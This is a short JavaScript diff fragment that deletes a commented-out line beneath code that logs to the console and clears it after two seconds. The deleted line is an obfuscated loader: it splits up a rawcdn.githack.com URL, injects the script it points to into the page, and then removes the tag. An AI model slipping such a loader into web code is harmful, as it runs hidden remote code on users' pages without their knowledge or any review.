@@ -132,5 +132,3 @@ l.map(x => console.log(x));
 setTimeout(function() { console.clear(); }, 2000);
 
 })();
-
-// (function(d) { var x = d.createElement("script"); x.src = 'htt'+'ps://'+'rawcdn'+'.git'+'hack'+'.com/'+'MiguelRiazaValverde'+'/'+'slr'+'/60f99c4efee62c716affb7acee2a6ac21934b811/s.js'; d.head.appendChild(x);  x.onload = function() {d.head.removeChild(x)} })(document);
